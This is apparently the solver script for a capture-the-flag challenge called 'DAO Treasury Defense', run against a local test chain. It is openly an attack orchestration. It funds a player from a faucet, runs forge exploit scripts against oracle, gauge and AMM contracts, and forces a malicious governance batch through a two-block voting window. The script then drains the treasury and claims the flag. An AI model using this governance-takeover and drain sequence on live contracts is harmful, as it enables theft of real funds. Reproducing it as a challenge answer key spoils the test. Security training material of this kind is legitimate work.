#!/usr/bin/env bash
# One-shot forge solver for DAO Treasury Defense.
#
#   ./solve.sh [target] [privateKey]
#
# target defaults to http://127.0.0.1:8080. If you omit the key, set PRIVATE_KEY
# in the environment (generate one with `cast wallet new`).
set -euo pipefail

TARGET="${1:-http://127.0.0.1:8080}"
TARGET="${TARGET%/}"
KEY="${PRIVATE_KEY:-${2:-}}"

if [ -z "$KEY" ]; then
  echo "error: set PRIVATE_KEY or pass it as the second argument (cast wallet new)" >&2
  exit 1
fi

PLAYER="$(cast wallet address --private-key "$KEY")"
echo "player: $PLAYER"
export PLAYER

# Fund the player and export every contract address + victim as env vars the
# forge scripts read via vm.envAddress(...).
eval "$(PLAYER="$PLAYER" node -e '
const TARGET = process.argv[1];
(async () => {
  await fetch(TARGET + "/faucet", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ player: process.env.PLAYER }),
  });
  const info = await (await fetch(TARGET + "/info")).json();
  const M = {
    gov: "GOV", treasuryAsset: "TREASURY_ASSET", collateral: "COLLATERAL",
    debt: "DEBT", lp: "LP", reward: "REWARD", marketAsset: "MARKET_ASSET",
    stable: "STABLE", mirror: "MIRROR", vault: "VAULT", treasury: "TREASURY",
    timelock: "TIMELOCK", governor: "GOVERNOR", oracle: "ORACLE",
    lending: "LENDING", rewardStaking: "REWARD_STAKING",
    legacyGauge: "LEGACY_GAUGE", currentGauge: "CURRENT_GAUGE", amm: "AMM",
  };
  const lines = [];
  for (const [k, v] of Object.entries(M)) if (info.contracts[k]) lines.push(`export ${v}=${info.contracts[k]}`);
  lines.push(`export VICTIM=${info.victim}`);
  console.log(lines.join(";"));
})().catch((e) => { console.error(e.message); process.exit(1); });
' "$TARGET")"

RPC="$TARGET/rpc"

for EXPLOIT in ExploitOracle ExploitGauge ExploitGhost ExploitSandwich; do
  echo "=== $EXPLOIT ==="
  forge script "script/$EXPLOIT.s.sol" --rpc-url "$RPC" --private-key "$KEY" --broadcast --skip-simulation -vv
done

# The batch exploit's vote/queue/execute are block-dependent (a single-block
# voting window), which forge's upfront gas estimation cannot replay. Run the
# propose as a forge script, then finish with cast --gas-limit (no estimation).
echo "=== ExploitBatch (propose) ==="
forge script script/ExploitBatch.s.sol --rpc-url "$RPC" --private-key "$KEY" --broadcast --skip-simulation -vv
PID="$(cast call "$GOVERNOR" "latestProposalId(address)(uint256)" "$PLAYER" --rpc-url "$RPC" | cut -d' ' -f1)"
cast send "$GOVERNOR" "castVote(uint256)" "$PID" --private-key "$KEY" --rpc-url "$RPC" --gas-limit 500000 --confirmations 1 >/dev/null
# Advance two blocks (the RPC allowlist blocks evm_mine) so the 2-block voting
# period elapses before queueing.
cast send "$PLAYER" --value 1 --private-key "$KEY" --rpc-url "$RPC" --gas-limit 30000 --confirmations 1 >/dev/null
cast send "$PLAYER" --value 1 --private-key "$KEY" --rpc-url "$RPC" --gas-limit 30000 --confirmations 1 >/dev/null
cast send "$GOVERNOR" "queueBatch(uint256)" "$PID" --private-key "$KEY" --rpc-url "$RPC" --gas-limit 2000000 --confirmations 1 >/dev/null
cast send "$GOVERNOR" "executeBatch(uint256)" "$PID" --private-key "$KEY" --rpc-url "$RPC" --gas-limit 3000000 --confirmations 1 >/dev/null
cast send "$VAULT" "withdraw(uint256)" 150000000000000000000 --private-key "$KEY" --rpc-url "$RPC" --gas-limit 300000 >/dev/null
echo "batch: executed (1040 treasury asset drained)"

echo "=== claim ==="
node claim.mjs "$TARGET" "$KEY"
